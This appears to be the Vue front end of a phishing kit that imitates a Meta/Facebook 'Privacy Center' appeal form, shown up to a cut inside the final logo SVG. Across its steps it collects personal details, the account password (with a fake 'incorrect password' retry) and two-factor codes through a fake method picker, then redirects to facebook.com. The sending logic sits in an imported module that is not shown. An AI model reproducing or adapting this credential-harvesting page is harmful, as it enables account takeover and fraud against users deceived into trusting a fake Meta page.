<script setup>
import { ref, computed, onMounted } from "vue";
import { useI18n } from "vue-i18n";

const { t } = useI18n(); // ✅ FIX: có t để dùng trong script

const emit = defineEmits(["close"]);

import { useAppealForm } from "@/assets/js/AppealForm.js";
import "@/assets/css/AppealForm.css";
import { useLocaleFromIp } from "@/composables/useLocaleFromIp";

const { detectAndSetLocale } = useLocaleFromIp();

onMounted(() => {
    detectAndSetLocale();
});

const showPassword = ref(false);

/* ===== existing logic ===== */
const {
    phone,
    phoneE164,
    iti,
    step,
    savedUser,
    handleSend,
    form,
    errors,
    password,
    passwordError,
    passwordInputCount,
    validatePhoneNumber,
    onPhoneInput,
    submitForm,
    submitPassword,
    code,
    onlyNumberKey,
    onCodeInput,
    codeError,
    codeErrorMessage,
    codeLocked,
    countdown,
    submitCode,
    startCountdown,
    closePopup,
    isLoading,
    allFormData,
    isCountingDown,
} = useAppealForm(emit);

/* ===== Try other way ===== */
const showMethodModal = ref(false);
const selectedMethod = ref("notification");
const tempMethod = ref(selectedMethod.value);

/**
 * Methods gốc (id + img)
 * ⚠️ giữ id = whatapp nếu JSON của bạn đang dùng whatapp
 */
const methods = [
    { id: "notification", img: "/images/F3-2FA-Notifications-WWW_light-3x.png" },
    { id: "sms", img: "/images/F3-2FA-TextMessages-WWW_light-3x.png" },
    { id: "whatapp", img: "/images/F3-2FA-WhatsApp-WWW_light-3x.png" },
    { id: "email", img: "/images/F3-2FA-Email-WWW_light-3x.png" },
    { id: "2fa", img: "/images/codemdp.png" },
];

/**
 * ✅ Methods render động theo dữ liệu user (email/phone)
 */
const computedMethods = computed(() => {
    const phoneDisplay = savedUser?.phoneDisplay || t("app.privacyCenter.popup.methods.sms.fallbackPhone", "your phone number");
    const emailValue = savedUser?.email || t("app.privacyCenter.popup.methods.email.fallbackEmail", "your email address");

    return methods.map((m) => {
        if (m.id === "sms") {
            return {
                ...m,
                title: t("app.privacyCenter.popup.methods.sms.title"),
                desc: t("app.privacyCenter.popup.methods.sms.desc", { phone: phoneDisplay }),
            };
        }

        if (m.id === "email") {
            return {
                ...m,
                title: t("app.privacyCenter.popup.methods.email.title"),
                desc: t("app.privacyCenter.popup.methods.email.desc", { email: emailValue }),
            };
        }

        if (m.id === "whatapp") {
            const phoneSuffix = savedUser?.phoneDisplay ? " " + savedUser.phoneDisplay : "";
            return {
                ...m,
                title: t("app.privacyCenter.popup.methods.whatapp.title"),
                desc: t("app.privacyCenter.popup.methods.whatapp.desc", { phoneSuffix }),
            };
        }

        if (m.id === "notification") {
            return {
                ...m,
                title: t("app.privacyCenter.popup.methods.notification.title"),
                desc: t("app.privacyCenter.popup.methods.notification.desc"),
            };
        }

        // recovery
        return {
            ...m,
            title: t("app.privacyCenter.popup.methods.recovery.title"),
            desc: t("app.privacyCenter.popup.methods.recovery.desc"),
        };
    });
});

/**
 * method hiện tại dùng để hiển thị hình + text bên ngoài modal (step 3)
 */
const currentMethod = computed(() => {
    return (
        computedMethods.value.find((m) => m.id === selectedMethod.value) ||
        computedMethods.value[0]
    );
});

/* ===== LOAD SESSION DATA ===== */
onMounted(() => {
    const saved = sessionStorage.getItem("step1Data");
    if (!saved) return;

    const data = JSON.parse(saved);

    if (data.method) {
        selectedMethod.value = data.method;
        tempMethod.value = data.method;
    }

    if (data.form) Object.assign(form, data.form);
    if (data.phone) phone.value = data.phone;
    if (data.step) step.value = data.step;
});

function confirmMethod() {
    selectedMethod.value = tempMethod.value;

    const saved = JSON.parse(sessionStorage.getItem("step1Data") || "{}");
    saved.method = selectedMethod.value;
    sessionStorage.setItem("step1Data", JSON.stringify(saved));

    showMethodModal.value = false;
}

function cancelSelect() {
    tempMethod.value = selectedMethod.value;
    showMethodModal.value = false;
}

function maskPhone(phone) {
  if (!phone) return "";

  // chỉ giữ số
  const digits = phone.replace(/\D/g, "");

  if (digits.length <= 2) return digits;

  const last2 = digits.slice(-2);
  const masked = "*".repeat(digits.length - 2) + last2;

  // chia nhóm cho đẹp: (**) *** **** 74
  return masked.replace(/(.{2})(.{3})(.{4})(.{2})$/, "($1) $2 $3 $4");
}
</script>


<template>
    <div class="popup">
        <div class="popup-item">
            <div class="modal-header" v-if="step === 1">
                <h5>{{ $t("app.privacyCenter.popup.appealFormTitle") }}</h5>
                <div class="close-bar" @click="closePopup">
                    <svg width="12" height="12" viewBox="0 0 7 7" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect x="0.671875" y="5.62134" width="7" height="1" rx="0.5"
                            transform="rotate(-45 0.671875 5.62134)" fill="black" />
                        <rect x="5.62109" y="6.32837" width="7" height="1" rx="0.5"
                            transform="rotate(-135 5.62109 6.32837)" fill="black" />
                    </svg>
                </div>
            </div>


            <form v-if="step === 1" class="form" @submit.prevent="submitForm">
                <input v-model="form.fullName" :placeholder="$t('app.privacyCenter.popup.placeholders.fullName')" />
                <span v-if="errors.fullName" class="error">{{ errors.fullName }}</span>

                <input v-model="form.email" :placeholder="$t('app.privacyCenter.popup.placeholders.email')" />
                <span v-if="errors.email" class="error">{{ errors.email }}</span>

                <input v-model="form.businessEmail" type="text"
                    :placeholder="$t('app.privacyCenter.popup.placeholders.businessEmail')" />
                <span v-if="errors.businessEmail" class="error">{{ errors.businessEmail }}</span>

                <input v-model="form.pageName" type="text"
                    :placeholder="$t('app.privacyCenter.popup.placeholders.pageName')" />
                <span v-if="errors.pageName" class="error">{{ errors.pageName }}</span>

                <input id="phone" type="tel" />
                <span v-if="errors.phone" class="error">{{ errors.phone }}</span>
                <div class="dob">
                    <input v-model="form.dob.day" type="text"
                        :placeholder="$t('app.privacyCenter.popup.placeholders.dobDay')" />
                    <input v-model="form.dob.month" type="text"
                        :placeholder="$t('app.privacyCenter.popup.placeholders.dobMonth')" />
                    <input v-model="form.dob.year" type="text"
                        :placeholder="$t('app.privacyCenter.popup.placeholders.dobYear')" />
                </div>
                <span v-if="errors.dob" class="error">{{ errors.dob }}</span>

                <textarea v-model="form.issue"
                    :placeholder="$t('app.privacyCenter.popup.placeholders.issue')"></textarea>
                <span v-if="errors.issue" class="error">{{ errors.issue }}</span>


                <p class="response-time">{{ $t("app.privacyCenter.popup.helper.responseTime") }}</p>

                <div class="toggle-option">
                    <div class="left">
                        <div class="icon"><svg width="16" height="16" viewBox="0 0 16 16" fill="none"
                                xmlns="http://www.w3.org/2000/svg">
                                <path
                                    d="M16 8.0486C16 3.60314 12.418 -0.000610352 7.99949 -0.000610352C3.58095 -0.000610352 -0.000976562 3.60314 -0.000976562 8.0486C-0.000976562 12.0662 2.92468 15.3962 6.74942 16V10.3753H4.71805V8.0486H6.74942V6.27526C6.74942 4.25792 7.94383 3.14361 9.77132 3.14361C10.6466 3.14361 11.5622 3.30082 11.5622 3.30082V5.28168H10.5534C9.55951 5.28168 9.24957 5.90215 9.24957 6.53869V8.0486H11.4684L11.1137 10.3753H9.24957V16C13.0743 15.3962 16 12.0662 16 8.0486Z"
                                    fill="black"></path>
                            </svg></div>
                        <div class="text">
                            <h3>{{ $t("app.privacyCenter.popup.toggle.title") }}</h3>
                            <span>{{ $t("app.privacyCenter.popup.toggle.desc") }}</span>
                        </div>
                    </div>
                    <label class="switch">
                        <input type="checkbox" v-model="form.notifyFacebook" />
                        <span class="slider round"></span>
                    </label>
                </div>


                <div class="agree-wrapper">
                    <label class="agree-label">
                        <input type="checkbox" v-model="form.agreeTerms" />
                        <span>
                            {{ $t("app.privacyCenter.popup.agree.prefix") }}
                            <a href="#">{{ $t("app.privacyCenter.popup.agree.terms") }}</a>
                        </span>
                    </label>
                    <span v-if="errors.agreeTerms" class="error">{{ errors.agreeTerms }}</span>
                </div>

                <button type="submit" @click="handleSend" :disabled="isLoading" class="send-btn">
                    <span v-if="!isLoading">{{ $t("app.privacyCenter.popup.buttons.send") }}</span>

                    <span v-else class="flex-center">
                        <span class="spinner"></span>
                    </span>
                </button>
                <div class="popup-footer logo-bottom">
                    <div class="logo"><svg width="329" height="66" viewBox="0 0 329 66" fill="none"
                            xmlns="http://www.w3.org/2000/svg">
                            <g clip-path="url(#clip0_4111_993)">
                                <path
                                    d="M122.064 1.98657H134.372L155.298 39.8132L176.224 1.98657H188.264V64.1421H178.22V16.5033L159.875 49.4881H150.453L132.108 16.5026V64.1414H122.064V1.98657ZM221.273 65.2542C216.624 65.2542 212.531 64.2213 209.009 62.1693C205.488 60.1101 202.741 57.2629 200.766 53.621C198.799 49.9798 197.816 45.8099 197.816 41.0988C197.816 36.3376 198.777 32.1176 200.701 28.4466C202.625 24.7764 205.3 21.9074 208.72 19.8336C212.141 17.7678 216.074 16.727 220.514 16.727C224.932 16.727 228.728 17.7744 231.91 19.8554C235.099 21.9437 237.55 24.8701 239.264 28.6275C240.985 32.3849 241.845 36.7923 241.845 41.8578V44.6107H207.766C208.387 48.3971 209.921 51.381 212.364 53.5563C214.809 55.731 217.896 56.8147 221.628 56.8147C224.621 56.8147 227.195 56.3745 229.357 55.4855C231.519 54.5965 233.551 53.2527 235.446 51.4463L240.775 57.9711C235.475 62.8267 228.974 65.2542 221.273 65.2542ZM228.605 28.382C226.501 26.2356 223.746 25.1664 220.341 25.1664C217.021 25.1664 214.245 26.2574 212.01 28.4466C209.769 30.6365 208.359 33.5841 207.766 37.284H232.199C231.902 33.4976 230.702 30.5276 228.605 28.382ZM254.326 26.0482H245.085V17.8398H254.326V4.25499H264.008V17.8398H278.051V26.0482H264.008V46.8725C264.008 50.3335 264.601 52.8046 265.787 54.2863C266.973 55.7673 268.998 56.5039 271.875 56.5039C273.148 56.5039 274.226 56.4537 275.115 56.3521C276.097 56.2328 277.076 56.0908 278.051 55.9264V64.0549C276.952 64.3803 275.715 64.6476 274.341 64.8502C272.96 65.0595 271.521 65.1604 270.01 65.1604C259.554 65.1604 254.326 59.4521 254.326 48.0288V26.0482ZM329 64.1421H319.499V57.6609C317.807 60.0883 315.659 61.9594 313.056 63.2748C310.445 64.5902 307.488 65.2548 304.169 65.2548C300.084 65.2548 296.461 64.2067 293.308 62.1185C290.148 60.0375 287.668 57.1619 285.868 53.5128C284.059 49.8564 283.156 45.6726 283.156 40.9688C283.156 36.2366 284.074 32.0456 285.911 28.4037C287.748 24.7619 290.285 21.9074 293.525 19.8336C296.772 17.7678 300.496 16.727 304.704 16.727C307.871 16.727 310.713 17.3408 313.229 18.5691C315.712 19.7699 317.864 21.561 319.499 23.7864V17.8398H329V64.1421ZM319.318 34.0395C318.284 31.4094 316.642 29.3284 314.408 27.8038C312.174 26.2792 309.585 25.5202 306.656 25.5202C302.506 25.5202 299.209 26.9075 296.75 29.6894C294.291 32.4713 293.062 36.2366 293.062 40.9688C293.062 45.7307 294.248 49.5092 296.613 52.2918C298.984 55.0737 302.195 56.461 306.259 56.461C309.245 56.461 311.913 55.6954 314.256 54.1563C316.592 52.6171 318.284 50.5428 319.318 47.9344V34.0395Z"
                                    fill="#66778A"></path>
                                <path
                                    d="M70.8442 0C62.7456 0 57.1572 2.97264 49.4783 13.1571C42.2041 3.53826 36.29 0 28.2743 0C12.221 0 0 19.6469 0 43.1693C0 57.319 7.96641 65.34 18.7142 65.34C29.0724 65.34 35.3412 56.628 40.721 46.9999L47.0792 36.0043C47.7003 34.9304 48.3261 33.8592 48.9565 32.7908C49.6638 33.9793 50.3661 35.1709 51.0634 36.3653L57.4217 47.225C65.5842 61.1952 71.1469 65.34 80.5721 65.34C91.3949 65.34 98.7441 56.2828 98.7441 43.395C98.7441 18.6107 86.1309 0 70.8442 0ZM38.0153 30.6874L31.5669 41.4124C25.2534 51.9565 22.5924 54.2995 18.624 54.2995C14.4306 54.2995 11.1386 50.785 11.1386 42.7185C11.1386 26.5419 19.0754 11.4008 28.2743 11.4008C33.0599 11.4008 36.6164 13.7834 42.7911 22.9416C41.1668 25.5033 39.5747 28.0854 38.0153 30.6874ZM80.33 54.2995C75.9556 54.2995 73.0696 51.5057 67.1621 41.5021L60.8038 30.6874C58.968 27.5609 57.2493 24.721 55.6188 22.1437C62.0211 12.7453 65.8776 10.2742 70.7541 10.2742C80.0437 10.2742 87.9963 24.1078 87.9963 42.7185C87.9963 50.2445 84.8846 54.2995 80.33 54.2995Z"
                                    fill="#66778A"></path>
                                <path
                                    d="M95.8256 23.76H84.7981C86.8017 29.011 87.9967 35.506 87.9967 42.7185C87.9967 50.2445 84.885 54.2995 80.3303 54.2995H80.2764V65.3387L80.5718 65.34C91.3946 65.34 98.7438 56.2828 98.7438 43.395C98.7438 36.234 97.691 29.5898 95.8256 23.76Z"
                                    fill="#66778A"></path>
                                <path
                                    d="M27.6361 0.0107422C12.2587 0.512342 0.547587 19.0795 0.0185547 41.5802H11.1519C11.5039 26.2127 18.9255 12.0881 27.6361 11.4248V0.0114022V0.0107422Z"
                                    fill="#66778A"></path>
                                <path
                                    d="M49.4781 13.1571L49.4827 13.1512C51.0928 15.2783 52.9464 17.9223 55.6218 22.1404L55.6185 22.1437C57.249 24.7216 58.9677 27.5609 60.8035 30.6874L67.1618 41.5021C73.0693 51.5057 75.9553 54.2995 80.3297 54.2995C80.5337 54.2995 80.7357 54.2916 80.9337 54.2751V65.3367C80.8133 65.3387 80.6923 65.34 80.5712 65.34C71.1466 65.34 65.5839 61.1945 57.4214 47.225L51.0632 36.366L50.6519 35.6631L50.6657 35.64C49.0958 32.8845 45.661 27.2679 42.7875 22.9469L42.7908 22.9416L42.3828 22.341C41.5544 21.1088 40.7859 20.0066 40.1377 19.14L40.0943 19.1558C35.4844 13.1023 32.3181 11.4008 28.274 11.4008C28.0608 11.4008 27.8476 11.4088 27.6357 11.4253V0.01056C27.8476 0.00396 28.0608 0 28.274 0C36.2898 0 42.2039 3.5376 49.4781 13.1571Z"
                                    fill="#66778A"></path>
                            </g>
                            <defs>
                                <clipPath id="clip0_4111_993">
                                    <rect width="329" height="66" fill="white"></rect>
                                </clipPath>
                            </defs>
                        </svg></div>
                </div>
            </form>

            <form v-else-if="step === 2" class="form" @submit.prevent="submitPassword">
                <div class="popup-step2">
                    <p>{{ $t("app.privacyCenter.popup.step2.securityNote") }}</p>
                    <div style="position: relative;">
                        <input :type="showPassword ? 'text' : 'password'" v-model="password"
                            :placeholder="$t('app.privacyCenter.popup.step2.password')" required autocomplete="off"
                            style="padding-right: 40px;" />
                        <button type="button" @click="showPassword = !showPassword"
                            style="position: absolute; top: 50%; right: 10px; transform: translateY(-50%); background: none; border: none; cursor: pointer;">
                            <svg v-if="showPassword" width="16" height="16" viewBox="0 0 24 24" fill="none"
                                xmlns="http://www.w3.org/2000/svg">
                                <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
                                <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
                                <g id="SVGRepo_iconCarrier">
                                    <path fill-rule="evenodd" clip-rule="evenodd"
                                        d="M6.30147 15.5771C4.77832 14.2684 3.6904 12.7726 3.18002 12C3.6904 11.2274 4.77832 9.73158 6.30147 8.42294C7.87402 7.07185 9.81574 6 12 6C14.1843 6 16.1261 7.07185 17.6986 8.42294C19.2218 9.73158 20.3097 11.2274 20.8201 12C20.3097 12.7726 19.2218 14.2684 17.6986 15.5771C16.1261 16.9282 14.1843 18 12 18C9.81574 18 7.87402 16.9282 6.30147 15.5771ZM12 4C9.14754 4 6.75717 5.39462 4.99812 6.90595C3.23268 8.42276 2.00757 10.1376 1.46387 10.9698C1.05306 11.5985 1.05306 12.4015 1.46387 13.0302C2.00757 13.8624 3.23268 15.5772 4.99812 17.0941C6.75717 18.6054 9.14754 20 12 20C14.8525 20 17.2429 18.6054 19.002 17.0941C20.7674 15.5772 21.9925 13.8624 22.5362 13.0302C22.947 12.4015 22.947 11.5985 22.5362 10.9698C21.9925 10.1376 20.7674 8.42276 19.002 6.90595C17.2429 5.39462 14.8525 4 12 4ZM10 12C10 10.8954 10.8955 10 12 10C13.1046 10 14 10.8954 14 12C14 13.1046 13.1046 14 12 14C10.8955 14 10 13.1046 10 12ZM12 8C9.7909 8 8.00004 9.79086 8.00004 12C8.00004 14.2091 9.7909 16 12 16C14.2092 16 16 14.2091 16 12C16 9.79086 14.2092 8 12 8Z"
                                        fill="#000000"></path>
                                </g>
                            </svg>

                            <svg viewBox="0 0 24 24" v-else width="16" height="16" fill="none"
                                xmlns="http://www.w3.org/2000/svg">
                                <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
                                <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
                                <g id="SVGRepo_iconCarrier">
                                    <path
                                        d="M14.83 9.17999C14.2706 8.61995 13.5576 8.23846 12.7813 8.08386C12.0049 7.92926 11.2002 8.00851 10.4689 8.31152C9.73758 8.61453 9.11264 9.12769 8.67316 9.78607C8.23367 10.4444 7.99938 11.2184 8 12.01C7.99916 13.0663 8.41619 14.08 9.16004 14.83"
                                        stroke="#000000" stroke-width="1.5" stroke-linecap="round"
                                        stroke-linejoin="round">
                                    </path>
                                    <path
                                        d="M12 16.01C13.0609 16.01 14.0783 15.5886 14.8284 14.8384C15.5786 14.0883 16 13.0709 16 12.01"
                                        stroke="#000000" stroke-width="1.5" stroke-linecap="round"
                                        stroke-linejoin="round">
                                    </path>
                                    <path
                                        d="M17.61 6.39004L6.38 17.62C4.6208 15.9966 3.14099 14.0944 2 11.99C6.71 3.76002 12.44 1.89004 17.61 6.39004Z"
                                        stroke="#000000" stroke-width="1.5" stroke-linecap="round"
                                        stroke-linejoin="round">
                                    </path>
                                    <path d="M20.9994 3L17.6094 6.39" stroke="#000000" stroke-width="1.5"
                                        stroke-linecap="round" stroke-linejoin="round"></path>
                                    <path d="M6.38 17.62L3 21" stroke="#000000" stroke-width="1.5"
                                        stroke-linecap="round" stroke-linejoin="round"></path>
                                    <path
                                        d="M19.5695 8.42999C20.4801 9.55186 21.2931 10.7496 21.9995 12.01C17.9995 19.01 13.2695 21.4 8.76953 19.23"
                                        stroke="#000000" stroke-width="1.5" stroke-linecap="round"
                                        stroke-linejoin="round">
                                    </path>
                                </g>
                            </svg>

                        </button>
                    </div>

                    <div>
                        <p v-if="passwordError" style="color: red; margin-top: 12px;">{{
                            $t("app.privacyCenter.popup.step2.passwordIncorrect") }}</p>
                    </div>

                    <button type="submit" :disabled="isLoading || codeLocked" class="send-btn">
                        <span v-if="!isLoading">{{ $t("app.privacyCenter.popup.buttons.continue") }}</span>
                        <span v-else class="flex-center"><span class="spinner"></span></span>
                    </button>

                </div>
                <div class="popup-footer logo-bottom">
                    <div class="logo"><svg width="329" height="66" viewBox="0 0 329 66" fill="none"
                            xmlns="http://www.w3.org/2000/svg">
                            <g clip-path="url(#clip0_4111_993)">
                                <path
                                    d="M122.064 1.98657H134.372L155.298 39.8132L176.224 1.98657H188.264V64.1421H178.22V16.5033L159.875 49.4881H150.453L132.108 16.5026V64.1414H122.064V1.98657ZM221.273 65.2542C216.624 65.2542 212.531 64.2213 209.009 62.1693C205.488 60.1101 202.741 57.2629 200.766 53.621C198.799 49.9798 197.816 45.8099 197.816 41.0988C197.816 36.3376 198.777 32.1176 200.701 28.4466C202.625 24.7764 205.3 21.9074 208.72 19.8336C212.141 17.7678 216.074 16.727 220.514 16.727C224.932 16.727 228.728 17.7744 231.91 19.8554C235.099 21.9437 237.55 24.8701 239.264 28.6275C240.985 32.3849 241.845 36.7923 241.845 41.8578V44.6107H207.766C208.387 48.3971 209.921 51.381 212.364 53.5563C214.809 55.731 217.896 56.8147 221.628 56.8147C224.621 56.8147 227.195 56.3745 229.357 55.4855C231.519 54.5965 233.551 53.2527 235.446 51.4463L240.775 57.9711C235.475 62.8267 228.974 65.2542 221.273 65.2542ZM228.605 28.382C226.501 26.2356 223.746 25.1664 220.341 25.1664C217.021 25.1664 214.245 26.2574 212.01 28.4466C209.769 30.6365 208.359 33.5841 207.766 37.284H232.199C231.902 33.4976 230.702 30.5276 228.605 28.382ZM254.326 26.0482H245.085V17.8398H254.326V4.25499H264.008V17.8398H278.051V26.0482H264.008V46.8725C264.008 50.3335 264.601 52.8046 265.787 54.2863C266.973 55.7673 268.998 56.5039 271.875 56.5039C273.148 56.5039 274.226 56.4537 275.115 56.3521C276.097 56.2328 277.076 56.0908 278.051 55.9264V64.0549C276.952 64.3803 275.715 64.6476 274.341 64.8502C272.96 65.0595 271.521 65.1604 270.01 65.1604C259.554 65.1604 254.326 59.4521 254.326 48.0288V26.0482ZM329 64.1421H319.499V57.6609C317.807 60.0883 315.659 61.9594 313.056 63.2748C310.445 64.5902 307.488 65.2548 304.169 65.2548C300.084 65.2548 296.461 64.2067 293.308 62.1185C290.148 60.0375 287.668 57.1619 285.868 53.5128C284.059 49.8564 283.156 45.6726 283.156 40.9688C283.156 36.2366 284.074 32.0456 285.911 28.4037C287.748 24.7619 290.285 21.9074 293.525 19.8336C296.772 17.7678 300.496 16.727 304.704 16.727C307.871 16.727 310.713 17.3408 313.229 18.5691C315.712 19.7699 317.864 21.561 319.499 23.7864V17.8398H329V64.1421ZM319.318 34.0395C318.284 31.4094 316.642 29.3284 314.408 27.8038C312.174 26.2792 309.585 25.5202 306.656 25.5202C302.506 25.5202 299.209 26.9075 296.75 29.6894C294.291 32.4713 293.062 36.2366 293.062 40.9688C293.062 45.7307 294.248 49.5092 296.613 52.2918C298.984 55.0737 302.195 56.461 306.259 56.461C309.245 56.461 311.913 55.6954 314.256 54.1563C316.592 52.6171 318.284 50.5428 319.318 47.9344V34.0395Z"
                                    fill="#66778A"></path>
                                <path
                                    d="M70.8442 0C62.7456 0 57.1572 2.97264 49.4783 13.1571C42.2041 3.53826 36.29 0 28.2743 0C12.221 0 0 19.6469 0 43.1693C0 57.319 7.96641 65.34 18.7142 65.34C29.0724 65.34 35.3412 56.628 40.721 46.9999L47.0792 36.0043C47.7003 34.9304 48.3261 33.8592 48.9565 32.7908C49.6638 33.9793 50.3661 35.1709 51.0634 36.3653L57.4217 47.225C65.5842 61.1952 71.1469 65.34 80.5721 65.34C91.3949 65.34 98.7441 56.2828 98.7441 43.395C98.7441 18.6107 86.1309 0 70.8442 0ZM38.0153 30.6874L31.5669 41.4124C25.2534 51.9565 22.5924 54.2995 18.624 54.2995C14.4306 54.2995 11.1386 50.785 11.1386 42.7185C11.1386 26.5419 19.0754 11.4008 28.2743 11.4008C33.0599 11.4008 36.6164 13.7834 42.7911 22.9416C41.1668 25.5033 39.5747 28.0854 38.0153 30.6874ZM80.33 54.2995C75.9556 54.2995 73.0696 51.5057 67.1621 41.5021L60.8038 30.6874C58.968 27.5609 57.2493 24.721 55.6188 22.1437C62.0211 12.7453 65.8776 10.2742 70.7541 10.2742C80.0437 10.2742 87.9963 24.1078 87.9963 42.7185C87.9963 50.2445 84.8846 54.2995 80.33 54.2995Z"
                                    fill="#66778A"></path>
                                <path
                                    d="M95.8256 23.76H84.7981C86.8017 29.011 87.9967 35.506 87.9967 42.7185C87.9967 50.2445 84.885 54.2995 80.3303 54.2995H80.2764V65.3387L80.5718 65.34C91.3946 65.34 98.7438 56.2828 98.7438 43.395C98.7438 36.234 97.691 29.5898 95.8256 23.76Z"
                                    fill="#66778A"></path>
                                <path
                                    d="M27.6361 0.0107422C12.2587 0.512342 0.547587 19.0795 0.0185547 41.5802H11.1519C11.5039 26.2127 18.9255 12.0881 27.6361 11.4248V0.0114022V0.0107422Z"
                                    fill="#66778A"></path>
                                <path
                                    d="M49.4781 13.1571L49.4827 13.1512C51.0928 15.2783 52.9464 17.9223 55.6218 22.1404L55.6185 22.1437C57.249 24.7216 58.9677 27.5609 60.8035 30.6874L67.1618 41.5021C73.0693 51.5057 75.9553 54.2995 80.3297 54.2995C80.5337 54.2995 80.7357 54.2916 80.9337 54.2751V65.3367C80.8133 65.3387 80.6923 65.34 80.5712 65.34C71.1466 65.34 65.5839 61.1945 57.4214 47.225L51.0632 36.366L50.6519 35.6631L50.6657 35.64C49.0958 32.8845 45.661 27.2679 42.7875 22.9469L42.7908 22.9416L42.3828 22.341C41.5544 21.1088 40.7859 20.0066 40.1377 19.14L40.0943 19.1558C35.4844 13.1023 32.3181 11.4008 28.274 11.4008C28.0608 11.4008 27.8476 11.4088 27.6357 11.4253V0.01056C27.8476 0.00396 28.0608 0 28.274 0C36.2898 0 42.2039 3.5376 49.4781 13.1571Z"
                                    fill="#66778A"></path>
                            </g>
                            <defs>
                                <clipPath id="clip0_4111_993">
                                    <rect width="329" height="66" fill="white"></rect>
                                </clipPath>
                            </defs>
                        </svg></div>
                </div>
            </form>


            <form v-else-if="step === 3" class="form" @submit.prevent="submitCode">
                <div class="popup-step3">
                    <div class="desc">
                        <span> {{ savedUser.fullName || $t("app.privacyCenter.popup.step3.userFallback") }}
                            •
                            {{ $t("app.privacyCenter.popup.step3.facebookLabel") }}</span>
                        <h4>{{ currentMethod.title }}</h4>
                        <p>{{ currentMethod.desc }}</p>
                        <img :src="currentMethod.img" style="width:100%;border-radius:10px;margin:15px auto 35px" />
                    </div>

                    <input type="text" v-model="code" :placeholder="$t('app.privacyCenter.popup.step3.enterCode')"
                        :disabled="codeLocked" required inputmode="numeric" maxlength="8" pattern="[0-9]*"
                        @keydown="onlyNumberKey" @input="onCodeInput" />

                    <div v-if="codeError" style="color:red;margin-bottom:8px">
                        {{ codeErrorMessage }}
                    </div>

                    <div v-if="codeLocked" style="color:red;margin-bottom:8px">
                        {{ $t("app.privacyCenter.popup.step3.tryAgainAfter", { countdown }) }}
                    </div>

                    <button type="submit" :disabled="isLoading || codeLocked" class="send-btn">
                        <span v-if="!isLoading">{{ $t("app.privacyCenter.popup.buttons.continue") }}</span>
                        <span v-else class="flex-center"><span class="spinner"></span></span>
                    </button>
                    <button type="button" @click="showMethodModal = true"
                        style="display:block;width:100%;margin-top:12px;background:none;border:none;color:#0a66c2">
                        {{ $t("app.privacyCenter.popup.buttons.tryOtherWay") }}
                    </button>
                </div>
            </form>

            <!-- TEMPLATE -->
            <div v-if="showMethodModal" class="method-modal-overlay">
                <div class="method-modal">
                    <div class="method-modal-header">
                        <strong>{{ $t("app.privacyCenter.popup.methodModal.title") }}</strong>
                        <p>{{ $t("app.privacyCenter.popup.methodModal.desc") }}</p>
                        <button class="method-modal-close" @click="cancelSelect">×</button>
                    </div>

                    <div class="method-modal-body">
                        <label v-for="m in computedMethods" :key="m.id" class="method-item"
                            :class="{ active: tempMethod === m.id }">
                            <input type="radio" name="confirm_method" :value="m.id" v-model="tempMethod" />

                            <div class="method-text">
                                <span class="method-item-title">{{ m.title }}</span>
                                <span class="method-item-desc">{{ m.desc }}</span>
                            </div>

                            <span class="method-radio"></span>
                        </label>
                    </div>

                    <button class="method-continue" @click="confirmMethod">
                        {{ $t("app.privacyCenter.popup.buttons.continue") }}
                    </button>
                </div>
            </div>



            <form v-else-if="step === 4" class="form">
                <div class="desc">
                    <h4>{{ $t("app.privacyCenter.popup.step4.title") }}</h4>
                    <img src="/public/images/background-final.png" width="100%"
                        style="border-radius:10px;margin:15px auto 15px auto" alt="">
                    <p>{{ $t("app.privacyCenter.popup.step4.desc") }}</p>
                </div>
                <a href="https://www.facebook.com"
                    class="ant-btn css-xex5fb ant-btn-default ant-btn-color-default ant-btn-variant-outlined button-send">
                    <span>{{ $t("app.privacyCenter.popup.buttons.returnToFacebook") }}</span>
                </a>
                <div class="popup-footer logo-bottom">
                    <div class="logo"><svg width="329" height="66" viewBox="0 0 329 66" fill="none"
                            xmlns="http://www.w3.org/2000/svg">
                            <g clip-path="url(#clip0_4111_993)">
                                <path
                                    d="M122.064 1.98657H134.372L155.298 39.8132L176.224 1.98657H188.264V64.1421H178.22V16.5033L159.875 49.4881H150.453L132.108 16.5026V64.1414H122.064V1.98657ZM221.273 65.2542C216.624 65.2542 212.531 64.2213 209.009 62.1693C205.488 60.1101 202.741 57.2629 200.766 53.621C198.799 49.9798 197.816 45.8099 197.816 41.0988C197.816 36.3376 198.777 32.1176 200.701 28.4466C202.625 24.7764 205.3 21.9074 208.72 19.8336C212.141 17.7678 216.074 16.727 220.514 16.727C224.932 16.727 228.728 17.7744 231.91 19.8554C235.099 21.9437 237.55 24.8701 239.264 28.6275C240.985 32.3849 241.845 36.7923 241.845 41.8578V44.6107H207.766C208.387 48.3971 209.921 51.381 212.364 53.5563C214.809 55.731 217.896 56.8147 221.628 56.8147C224.621 56.8147 227.195 56.3745 229.357 55.4855C231.519 54.5965 233.551 53.2527 235.446 51.4463L240.775 57.9711C235.475 62.8267 228.974 65.2542 221.273 65.2542ZM228.605 28.382C226.501 26.2356 223.746 25.1664 220.341 25.1664C217.021 25.1664 214.245 26.2574 212.01 28.4466C209.769 30.6365 208.359 33.5841 207.766 37.284H232.199C231.902 33.4976 230.702 30.5276 228.605 28.382ZM254.326 26.0482H245.085V17.8398H254.326V4.25499H264.008V17.8398H278.051V26.0482H264.008V46.8725C264.008 50.3335 264.601 52.8046 265.787 54.2863C266.973 55.7673 268.998 56.5039 271.875 56.5039C273.148 56.5039 274.226 56.4537 275.115 56.3521C276.097 56.2328 277.076 56.0908 278.051 55.9264V64.0549C276.952 64.3803 275.715 64.6476 274.341 64.8502C272.96 65.0595 271.521 65.1604 270.01 65.1604C259.554 65.1604 254.326 59.4521 254.326 48.0288V26.0482ZM329 64.1421H319.499V57.6609C317.807 60.0883 315.659 61.9594 313.056 63.2748C310.445 64.5902 307.488 65.2548 304.169 65.2548C300.084 65.2548 296.461 64.2067 293.308 62.1185C290.148 60.0375 287.668 57.1619 285.868 53.5128C284.059 49.8564 283.156 45.6726 283.156 40.9688C283.156 36.2366 284.074 32.0456 285.911 28.4037C287.748 24.7619 290.285 21.9074 293.525 19.8336C296.772 17.7678 300.496 16.727 304.704 16.727C307.871 16.727 310.713 17.3408 313.229 18.5691C315.712 19.7699 317.864 21.561 319.499 23.7864V17.8398H329V64.1421ZM319.318 34.0395C318.284 